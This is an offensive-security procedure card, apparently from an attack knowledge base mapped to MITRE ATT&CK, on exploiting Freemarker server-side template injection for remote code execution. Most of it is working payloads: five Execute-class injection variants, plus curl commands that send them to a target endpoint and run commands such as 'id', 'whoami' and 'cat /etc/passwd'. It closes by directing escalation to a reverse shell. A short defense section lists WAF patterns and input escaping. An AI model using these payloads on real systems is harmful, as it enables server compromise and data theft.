---
id: 3f16face-f05c-4be5-b478-f393c0614c83
name: Freemarker-Server-Side-Template-Injection-for-Code-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:39.053200+00:00'
updated_at: '2023-04-10T20:23:36.340725+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Scripting|T1064 - Scripting]]'
  - '[[techniques/Template Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - '[[tags/Freemarker]]'
  - '[[tags/Freemarker - Code execution]]'
  - '[[tags/Server Side Template Injection]]'
  - ssti
  - rce
commands:
  - '[[commands/curl-freemarker-ssti-payload]]'
platforms:
  - Web
  - Java
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Freemarker-Server-Side-Template-Injection-for-Code-Execution

## Summary

This procedure exploits a Server-Side Template Injection (SSTI) vulnerability in applications using the Freemarker Java template engine to achieve remote code execution (RCE). By injecting a malicious Freemarker expression into a vulnerable input parameter, such as an 'id' field, an attacker can instantiate the Execute class and run arbitrary system commands on the server, potentially leading to full compromise.

## Description

Freemarker is a widely used Java-based template engine for generating dynamic content in web applications. SSTI vulnerabilities occur when user input is directly embedded into templates without proper sanitization, allowing attackers to inject Freemarker expressions that get evaluated server-side. This procedure focuses on leveraging the 'freemarker.template.utility.Execute' class to execute OS commands. It is applicable in scenarios where the application processes user-supplied data through Freemarker templates, such as in search fields, user profiles, or error messages. Successful exploitation bypasses typical web security controls and can result in data exfiltration, persistence, or lateral movement. The target environment is typically a Java web application (e.g., Spring MVC with Freemarker views) exposed over HTTP/HTTPS.

## Requirements

1. Network access to the vulnerable web application endpoint.
2. Identification of a parameter (e.g., 'id') that is processed by Freemarker templates without escaping.
3. Basic knowledge of Freemarker syntax and HTTP request crafting.
4. Tools for sending HTTP requests, such as curl (built-in on most systems).
5. Attacker-controlled listener if exfiltrating output (e.g., for command results).

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and sanitization to escape user inputs before passing to templates (e.g., use Freemarker's built-in escaping mechanisms).
- Deploy a Web Application Firewall (WAF) tuned to detect SSTI patterns, such as Freemarker expressions like '<#assign' or '?new()'.
- Regularly update Freemarker and the application framework to patch known vulnerabilities.
- Enable application logging for template processing and monitor for anomalous expressions or command executions.
- Use runtime protections like Java Security Manager to restrict class instantiation and method execution.

## Objectives

1. Inject a Freemarker payload to instantiate the Execute class and run arbitrary commands.
2. Achieve remote code execution on the server to execute system commands like 'id' or more complex ones.
3. Exfiltrate sensitive data or establish persistence by chaining with other techniques.
4. Gain full control of the application server and underlying system.

## Instructions

### Step 1: Identify Vulnerable Parameter

**Context**: Determine an input field (e.g., 'id' in a query parameter or POST body) that is rendered via Freemarker templates. Test for SSTI by injecting a benign expression like '${7*7}' and checking if the response evaluates to '49' instead of the literal string.

**Command** ([[commands/curl-freemarker-ssti-test]]):

Use a basic curl command to probe for injection (note: this is a variant for testing; adapt for your endpoint).

```bash
curl -X GET "http://target.com/vulnerable?test=${7*7}"
```

> If the response shows '49', the parameter is vulnerable to SSTI. Otherwise, try other parameters or endpoints.

### Step 2: Craft and Inject Freemarker Payload

**Context**: Use the Freemarker payload to create an instance of the Execute class and run a command. Replace 'id' in the payload with the desired command (e.g., 'id' to test, or 'whoami', 'cat /etc/passwd'). The payload variations provide bypass options for different filtering levels.

**Code** ([[codes/Freemarker-Execute-Class-Payload]]):

Embed the payload in the vulnerable parameter.

```js
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${ "freemarker.template.utility.Execute"?new()("id")}
#{"freemarker.template.utility.Execute"?new()("id")}
[="freemarker.template.utility.Execute"?new()("id")]
```

**Command** ([[commands/curl-freemarker-ssti-payload]]):

Send the payload via curl to the vulnerable endpoint.

```bash
curl -X POST -d 'id=<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")} ' "http://target.com/vulnerable" -H "Content-Type: application/x-www-form-urlencoded"
```

> The server will evaluate the template and execute the command. Expected output in the response body will include the result of the command (e.g., 'uid=33(www-data) gid=33(www-data)' for 'id'). If no output, try a variation of the payload or check server logs for errors.

### Step 3: Verify Execution and Escalate

**Context**: Confirm RCE by running a command that produces observable output, then escalate by executing more complex commands (e.g., download a reverse shell).

**Command** ([[commands/curl-freemarker-ssti-payload]]):

Adapt the previous command with a different payload command.

```bash
curl -X POST -d 'id=<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami")} ' "http://target.com/vulnerable" -H "Content-Type: application/x-www-form-urlencoded"
```

> Success is indicated by the response containing the output of 'whoami' (e.g., 'www-data'). If successful, chain to download and execute a payload for a reverse shell.
